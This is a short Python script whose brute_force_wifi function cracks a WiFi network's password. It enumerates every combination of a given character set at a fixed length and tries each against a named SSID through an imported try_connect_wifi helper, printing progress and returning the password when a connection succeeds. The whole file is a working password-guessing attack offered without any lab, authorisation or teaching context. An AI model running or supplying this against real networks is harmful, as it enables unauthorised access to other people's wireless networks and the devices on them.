import itertools
import time
from wifi_connector import try_connect_wifi

def brute_force_wifi(ssid, charset, max_length=4):
    """Brute force the WiFi password using the given character set."""
    attempts = 0
    start_time = time.time()
    
    for length in range(max_length, max_length + 1):
        for combo in itertools.product(charset, repeat=length):
            password = "".join(combo)
            attempts += 1
            print(f"Attempt {attempts} => {password}")
            
            if try_connect_wifi(ssid, password):
                end_time = time.time()
                return password, attempts, end_time - start_time
            
            if attempts % 100 == 0:
                print(f"Progress: Tried {attempts} combinations")
    
    return None, attempts, time.time() - start_time